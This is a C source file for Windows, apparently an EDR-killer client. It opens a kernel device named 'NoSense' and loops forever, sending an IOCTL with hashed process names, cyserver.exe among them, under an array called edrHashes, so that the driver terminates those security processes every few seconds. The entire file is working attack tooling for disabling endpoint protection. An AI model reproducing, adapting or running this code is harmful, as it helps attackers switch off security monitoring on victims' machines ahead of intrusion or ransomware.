#include <stdio.h>
#include <windows.h>

#define IOCTL_TERM	CTL_CODE(0x8000, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define MAX_PROCESS_NAME 260

#pragma pack(push, 1)
typedef struct {
    UINT32 Hash;
} IOCTL_STRUCT;
#pragma pack(pop)

void IOCTL_STRUCT_Init(IOCTL_STRUCT* s, const UINT32 Hash) {
    s->Hash = Hash;
}

//UINT32 HashStringDjb2aW(PWCHAR String)
//{
//    UINT32 Hash = 5381;
//    UCHAR c = 0;
//
//    while ((c = (BYTE)*String++))
//        Hash = ((Hash << 5) + Hash) ^ c;
//
//    return Hash;
//}
UINT32 HashStringDjb2aW(PWCHAR String)
{
    UINT32 Hash = 5381;
    UCHAR c = 0;
    UCHAR lowerChar = 0;

    while ((c = (BYTE)*String++)) {
        if (c >= 'A' && c <= 'Z') {
            lowerChar = c + 0x20;
        }
        else {
            lowerChar = c;
        }
        Hash = ((Hash << 5) + Hash) ^ lowerChar;
    }

    return Hash;
}

int main(int argc, char** argv) {

    if (argc != 2) {
        printf("Usage: %s <ProcessName>\n", argv[0]);
        return 1;
    }

    const wchar_t* procName[] = {
        L"Notepad.exe",
        L"cyserver.exe",
        L"calc.exe",
    };

    printf("[+] Case-Insensitive Process Hashes:\n");
    for (int i = 0; i < sizeof(procName) / sizeof(procName[0]); i++) {
        UINT32 hash = HashStringDjb2aW(procName[i]);
        wprintf(L"Process: %s, Hash: 0x%08X\n", procName[i], hash);
    }
   
    const UINT32 edrHashes[] = { 0xC03F4AB6, 0xE0321B7E, 0x4324E72C };

    const size_t procCount = sizeof(edrHashes) / sizeof(edrHashes[0]);

    const char* deviceName = "\\\\.\\NoSense";
    DWORD bytesReturned;
    IOCTL_STRUCT ioctlStruct;

    printf("[+] Trying to open handle to %s\n", deviceName);

    HANDLE hDevice = CreateFileA(deviceName,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open handle to %s [%u]\n", deviceName, GetLastError());
        return -1;
    }
    printf("[+] Handle to %s Successfully Opened\n", deviceName);

    while (TRUE) {
        for (size_t i = 0; i < procCount; i++) {
            IOCTL_STRUCT_Init(&ioctlStruct, edrHashes[i]);

            BOOL status = DeviceIoControl(hDevice,
                IOCTL_TERM,
                (LPVOID)&ioctlStruct,
                sizeof(ioctlStruct),
                NULL,
                0,
                &bytesReturned,
                NULL);

            if (!status) {
                printf("[-] Failed to Kill the process: 0x%X\n", GetLastError());
            }
            else {
                printf("[+] Process 0x%X Terminated Successfully\n", edrHashes[i]);
            }
			Sleep(5000);
        }
    }

    CloseHandle(hDevice);

    return 0;
}